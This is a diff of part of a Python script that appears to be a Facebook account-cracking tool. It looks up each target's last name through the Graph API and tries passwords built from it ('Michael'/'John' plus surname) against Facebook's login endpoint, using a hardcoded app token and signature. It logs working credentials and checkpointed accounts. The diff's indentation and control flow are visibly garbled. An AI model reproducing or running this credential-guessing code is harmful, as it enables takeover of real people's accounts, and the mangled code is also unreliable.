@@ -258,23 +258,25 @@ def pb():
 		global cps, oks
 		user=arg
 		try:
-                      h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
-                      j=json.loads(h.text)
-          ps1=('Michael'+j['last_name'])
-      dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-      k=json.load(dt)
-      if 'www.facebook.com' in k['error_msg']:
-          print(S+'[CP] | '+user+' | '+ps1+'•'+name+')
-          cps.append(user+ps1)
-      else:
-          if 'access_token' in k:
-              print (G+'[OK] | '+user+' | '+ps1+'•'+name+')
-              oks.append(user+ps1)
-          else:
-              ps2=('John'+j['last_name'])
+			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
+			j=json.loads(h.text)
+			ps1=('Michael'+j['last_name'])
+			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			k=json.load(dt)
+			if 'www.facebook.com' in k['error_msg']:
+				print(S+'[CP] | '+user+' | '+ps1+'•'+name+')
+				      cps.append(user+ps1)
+				      else:
+				      if 'access_token' in k:
+				      print (G+'[OK] | '+user+' | '+ps1+'•'+name+')
+					     oks.append(user+ps1)
+					     else:
+					     ps2=('John'+j['last_name'])
+					     dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+k=json.load(dt)
+              
       
-              dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-              k=json.load(dt)
+
               if 'www.facebook.com' in k['error_msg']:
                   print(S+'[CP] | '+user+' | '+ps2+'•'+name+')
                   cps.append(user+ps2)
